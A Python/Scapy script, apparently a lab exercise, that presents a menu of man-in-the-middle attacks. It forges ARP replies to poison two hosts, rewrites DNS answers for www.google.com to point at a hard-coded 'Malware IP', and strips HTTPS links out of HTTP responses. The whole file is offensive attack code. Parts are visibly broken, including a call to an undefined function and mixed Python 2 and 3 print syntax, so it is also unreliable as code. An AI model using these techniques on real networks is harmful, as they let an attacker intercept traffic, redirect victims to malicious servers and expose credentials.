from scapy.all import *
import time

ipM1 = "192.168.56.101" #  Rename to IPAttacker? 
ipM2 = "192.168.56.102"
ipM3 = "192.168.56.103" # IPVictim?
ipMal = "50.63.7.226"   # Malware IP
trapUrl = "www.google.com"
ipTrap = "142.251.32.100"
ip6Mal = ""
verbose = False
type = "0"

def ARP_spoofing():
    macM1 = "08:00:27:b7:c4:af"
    macM2 = "08:00:27:CC:28:6f"
    macM3 = "08:00:27:d0:25:4b"

    if verbose:
        print "Starting ARP spoofing attack"
        print "Creating forged ARP packet to send towards victim"

    arp_M1 = Ether() / ARP()
    arp_M1[Ether].src = macM3
    arp_M1[ARP].hwsrc = macM3
    arp_M1[ARP].psrc = ipM2
    arp_M1[ARP].hwdst = macM1
    arp_M1[ARP].pdst = ipM1

    if verbose:
        print "Creating forged ARP packet to send towards server"

    arp_M2 = Ether() / ARP()
    arp_M2[Ether].src = macM3
    arp_M2[ARP].hwsrc = macM3
    arp_M2[ARP].psrc = ipM1
    arp_M2[ARP].hwdst = macM2
    arp_M2[ARP].pdst = ipM2

    if verbose:
        print "Sending forged packets on interface 'enp0s3'"

    sendp(arp_M1, iface = "enp0s3")
    sendp(arp_M2, iface = "enp0s3")

# DNS-Spoof Attack
def dns_spoof_attack():
    if verbose:
        print "Starting DNS spoof attack"

    return sniff(filter='udp port 53', count=16, prn=process_packet)
    # for packet in packets:
    #     if packet.haslayer(DNS):
    #         dns_packet = packet[DNS]
    #         print("DNS Query: ", dns_packet.qd.qname)
    #         # print("DNS Response: ", dns_packet.an.rdata)
            
    # dns_p1 = IP(src=ipMal, dst=ipM3) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=trapUrl))
    # dns_p1.show()

def process_packet(packet):
    if verbose:
        print("Looking for DNS Response Packets")
    if IP in packet and UDP in packet and DNS in packet:
        if verbose:
            print ("Found DNS packet")
        ip_packet = packet[IP]
        udp_packet = packet[UDP]
        dns_packet = packet[DNS]
        destination_ip = ip_packet.dst
        destination_port = udp_packet.dport
        
        if trapUrl in dns_packet.qd.qname:
            # dns_packet.show()
            print(" ------------- ")
            print (dns_packet.ancount)
            if (dns_packet.qr == 1):
                print("Before: " + dns_packet.an.rdata + ', ' + dns_packet.an.rrname + ", type = ")
                print(dns_packet.an.type)
                # dns_packet.an.rdata = ipMal
                if (dns_packet.an.type == 1):
                    dns_packet.an.rdata = ipMal
                elif (dns_packet.an.type == 28):
                    # dns_packet.an = DNSRR(rrname=trapUrl, rdata=ip6Mal)
                    packet[IP].dst = packet[IP].src
                print("Changed address to: " + dns_packet.an.rdata + ', ' + dns_packet.an.rrname)

                del packet[IP].chksum
                del packet[IP].len
                del packet[UDP].chksum
                del packet[UDP].len
                
                sendp(packet, iface = "enp0s3", verbose=True)

            # Display complete DNS packet information
            


# SSL strip one packet
def ssl_strip(packet):
    if verbose:
        print "Found HTTP response"
    if packet[TCP].payload:
        payload = bytes(packet[TCP].payload)

        # Only work with packets that are HTTP responses
        if b"HTTP" in payload and b"200 OK" in payload:
            if verbose:
                print "Stripping the secure channels from the packet"
            # Strip the secure channels from the packet
            modified_payload = payload.replace(b"HTTPS://",b"HTTP://")
            packet.payload = bytes(modified_payload)

            # By deleting the checksums,scapy will automatically recalculate them
            del packet[IP].chksum
            del packet[TCP].chksum

            print "Send altered packet"
            send(packet, iface="enp0s3", verbose=0)

def ssl_strip_attack():
    if verbose:
        print "Starting SSL strip attack"

    packets = dns_spoof_attacks()
    for packet in packets:
	ssl_strip(packet)

# =============== Text Interface ===============

def attack(type):
    done = False
    try:
        while(not done):
            type = str(input(   "\nPlease select the desired attack\n" +
                    "type \"1\" for ARP Poisoning \n" +
                    "type \"2\" for DNS Spoofing \n" +
                    "type \"3\" for SSL Stripping \n" +
                    "type \"4\" to exit \n"))
            if type == "1":
                ARP_spoofing()
            elif type == "2":
                dns_spoof_attack()
            elif type == "3":
                ssl_strip_attack()
            elif type == "4":
                print ("Ending...")
                done = True
                break
            else:
                print("Input error!")
            # time.sleep takes in seconds, not miliseconds
            time.sleep(0.5) # wait half a second

    except KeyboardInterrupt:
        print ("KeyboardInterrupt, stopping the whole attack")
        pass

if __name__ == "__main__":
    mode = str(input(   "Plase select the attack mode:\n" +
                    "type \"1\" for silent mode;\n" +
                    "type \"2\" for verbose mode\n"))

    # Set the verbosity of the attack
    if mode == "1":
        verbose = False
    elif mode == "2":
        verbose = True
    else:
        print("Input error!")
    attack(type)
        
